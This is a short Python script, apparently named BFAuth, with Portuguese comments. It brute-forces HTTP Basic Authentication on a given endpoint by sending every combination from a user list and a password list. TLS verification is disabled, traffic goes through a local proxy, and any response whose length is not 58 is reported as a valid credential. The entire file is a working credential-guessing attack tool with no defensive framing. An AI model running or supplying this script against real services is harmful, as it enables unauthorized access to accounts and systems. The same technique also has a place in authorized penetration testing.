import base64
import requests as r
import sys
import argparse
import urllib3
from itertools import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Catching arguments
parser = argparse.ArgumentParser()
parser.add_argument('-p', dest="passlist", help='passlist')
parser.add_argument('-u', dest="userlist", help='userlist')
parser.add_argument('-e', dest="endpoint", help='endpoint')
args = parser.parse_args()


proxies = {
	"http"  : "http://127.0.0.1:8081",
	"https" : "http://127.0.0.1:8081"
}

# Endpoint de geracao de senha
endpoint = args.endpoint

def banner():
	print("""
	__________________________________
	 ____  _____ _         _   _     
	| __ )|  ___/ \  _   _| |_| |__  
	|  _ \| |_ / _ \| | | | __| '_ \ 
	| |_) |  _/ ___ \ |_| | |_| | | |
	|____/|_|/_/   \_\__,_|\__|_| |_|
	__________________________________
	                        by lalonso



	""")
	
def bfAuth():

	# Contador
	counter = 1

	# Abrir arquivos de lista de usuarios e senhas
	users = open(args.userlist, "r")
	passwords = open(args.passlist, "r")

	# Verifica arquivos em modo leitura
	if users.mode == 'r' and passwords.mode == 'r':
		
		# Loop na lista de usuarios
		for line1, line2 in product(users,passwords):
			# Separar usuario e senhas por linha dos arquivos
			user = line1.strip()
			password = line2.strip()							

			# Define credenciais em texto claro
			authStr = "{}:{}".format(user,password)
			
			# Muda de sring para bytes
			auth = bytes(authStr, 'utf-8')
			
			# Encoda em base64
			encoded = base64.b64encode(auth)
			
			# Define o authorization header
			headers = {
				"Authorization" : "Basic {}".format(encoded.decode('utf-8'))
			}

			out = r.get(endpoint, headers=headers, verify=False, proxies=proxies)

			if len(out.text) != 58:
				print("Requisição: " + str(counter) + "\nCredencial válida: " + auth.decode('utf-8') + "\nStatus: " + str(out.status_code) + "\nDados: " + out.text + "\n")
			
			counter+=1

# Execução
banner()
bfAuth()